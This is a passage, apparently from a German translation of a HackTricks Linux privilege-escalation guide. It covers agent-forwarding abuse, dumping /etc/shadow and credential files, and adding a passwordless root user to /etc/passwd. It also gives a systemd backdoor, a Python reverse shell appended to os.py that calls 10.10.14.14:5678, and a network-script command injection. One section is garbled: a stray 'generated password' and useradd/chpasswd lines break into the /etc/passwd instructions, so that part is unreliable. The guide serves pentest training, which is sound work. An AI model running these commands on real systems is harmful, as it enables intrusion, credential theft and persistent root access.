- `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die öffentlichen Schlüssel enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Es kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass, wenn du versuchst, dich mit dem **privaten** Schlüssel des Nutzers "**testusername**" anzumelden, ssh den öffentlichen Schlüssel deines Schlüssels mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleicht

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **deine lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf deinem Server liegen zu lassen. So wirst du in der Lage sein, **per ssh auf einen Host zu springen** und von dort **auf einen anderen Host weiterzuspringen**, **wobei du den Schlüssel** nutzt, der auf deinem **ursprünglichen Host** liegt.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, dieser Host Zugriff auf die keys hat (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen überschreiben** und diese Konfiguration erlauben oder verbieten.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **zulassen** oder **verweigern** (Standard ist zulassen).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise missbrauchen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Wenn du also eine dieser Dateien schreiben oder ändern kannst, kannst du **Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, solltest du es auf **sensible Details** überprüfen.

### Passwd/Shadow-Dateien

Je nach OS können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es kann ein Backup vorhanden sein. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob du sie lesen kannst**, um zu sehen, **ob sich hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In manchen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder einer äquivalenten)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Schreibbares /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Generated password: 7f$K9bPq2!Rz4WxT

sudo useradd -m -s /bin/bash hacker
echo 'hacker:7f$K9bPq2!Rz4WxT' | sudo chpasswd
sudo chage -d 0 hacker
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
z. B.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Du kannst jetzt den Befehl `su` mit `hacker:hacker` verwenden

Alternativ kannst du die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\\
WARNUNG: Du könntest die aktuelle Sicherheit der Maschine beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
HINWEIS: Auf BSD-Systemen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`; außerdem wurde `/etc/shadow` in `/etc/spwd.db` umbenannt.

Du solltest prüfen, ob du in einige **sensible Dateien** schreiben kannst. Zum Beispiel: Kannst du in eine **Service-Konfigurationsdatei** schreiben?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **tomcat**-Server ausführt und du die **Tomcat service configuration file inside /etc/systemd/,** ändern kannst, dann kannst du die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ihre backdoor wird beim nächsten Start von tomcat ausgeführt.

### Verzeichnisse prüfen

Die folgenden Verzeichnisse können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich werden Sie das letzte nicht lesen können, aber versuchen Sie es.)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Ungewöhnlicher Speicherort/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB files
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sicherungen**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die passwords enthalten könnten**.\
**Ein weiteres interessantes Tool**, das Sie dafür verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die viele auf einem lokalen Rechner gespeicherte passwords für Windows, Linux & Mac ausliest.

### Logs

Wenn Sie Logs lesen können, können Sie möglicherweise **interessante/vertrauliche Informationen darin** finden. Je seltsamer das Log ist, desto interessanter wird es wahrscheinlich sein.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **audit logs** es Ihnen ermöglichen, **passwords in audit logs zu protokollieren**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um Logs zu lesen, ist die Gruppe [**adm**](interesting-groups-linux-pe/index.html#adm-group) sehr hilfreich.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Du solltest auch nach Dateien suchen, die das Wort "**password**" im **Namen** oder im **Inhalt** enthalten, und außerdem in logs nach IPs und emails oder nach hashes regexps suchen.\
Ich werde hier nicht aufzählen, wie man das alles macht, aber falls du interessiert bist, kannst du dir die letzten Checks anschauen, die [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) ausführt.

## Schreibbare Dateien

### Python library hijacking

Wenn du weißt, **wo** ein python script ausgeführt wird und du **in diesen Ordner schreiben kannst** oder **python libraries modifizieren kannst**, kannst du die os library verändern und mit einer backdoor versehen (wenn du dort schreiben kannst, wo das python script ausgeführt wird, kopiere die os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Eine Schwachstelle in `logrotate` ermöglicht es Benutzern mit **write permissions** für eine Logdatei oder deren übergeordnete Verzeichnisse, möglicherweise Privilegien zu eskalieren. Das liegt daran, dass `logrotate`, das oft als **root** läuft, so manipuliert werden kann, dass beliebige Dateien ausgeführt werden, besonders in Verzeichnissen wie _**/etc/bash_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu prüfen, sondern auch in jedem Verzeichnis, auf das Logrotation angewendet wird.

> [!TIP]
> Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter

Detailliertere Informationen zur Schwachstelle finden sich auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Du kannst diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ist sehr ähnlich zu [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, daher solltest du, sobald du Logdateien verändern kannst, prüfen, wer diese Logs verwaltet und ob du Privilegien eskalieren kannst, indem du die Logs durch symlinks ersetzt.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus welchem Grund auch immer ein `ifcf-<whatever>` Script nach _/etc/sysconfig/network-scripts_ **schreiben** kann **oder** ein vorhandenes anpassen kann, dann ist dein **system is pwned**.

Network-Skripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Allerdings werden sie auf Linux von Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=`-Attribut in diesen Network-Skripten nicht korrekt behandelt. Wenn du **Leerzeichen im Namen hast, versucht das System, den Teil nach dem Leerzeichen auszuführen**. Das bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Hinweis: das Leerzeichen zwischen Network und /bin/id_)

### **init, init.d, systemd, und rc.d**

Das Verzeichnis `/etc/init.d` enthält **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Management-System**. Es beinhaltet Skripte, um Dienste zu `start`en, zu `stop`pen, zu `restart`en und manchmal zu `reload`n. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/`. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **service management**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Management-Aufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte weiterhin neben Upstart-Konfigurationen verwendet, wegen einer Kompatibilitätsschicht in Upstart.

**systemd** gilt als moderner Init- und Service-Manager und bietet erweiterte Funktionen wie bedarfsorientiertes Starten von Daemons, Automount-Verwaltung und Snapshots des Systemzustands. Es organisiert Dateien in `/usr/lib/systemd/` für Distributionspakete und `/etc/systemd/system/` für Administratoranpassungen und vereinfacht so die Systemverwaltung.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks hooken häufig einen syscall, um privilegierte Kernel-Funktionalität an einen userspace manager freizugeben. Schwache Manager-Authentifizierung (z. B. Signaturprüfungen basierend auf FD-order oder schlechte Passwortschemata) kann einer lokalen App erlauben, den Manager zu impersonieren und auf bereits gerooteten Geräten root-Rechte zu erlangen. Mehr dazu und Exploit-Details hier:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-getriebene service discovery in VMware Tools/Aria Operations kann einen Binärpfad aus Prozess-Commandlines extrahieren und diesen mit -v in einem privilegierten Kontext ausführen. Zu großzügige Patterns (z. B. die Verwendung von \S) können mit von Angreifern platzierten Listeners in beschreibbaren Orten (z. B. /tmp/httpd) übereinstimmen und zur Ausführung als root führen (CWE-426 Untrusted Search Path).

Mehr erfahren und ein generalisiertes Muster, das auf andere discovery/monitoring stacks anwendbar ist, siehe hier:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Bestes Tool, um lokale privilege escalation-Vektoren unter Linux zu finden:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert Kernel-Vulnerabilities in Linux und MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Sammlung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
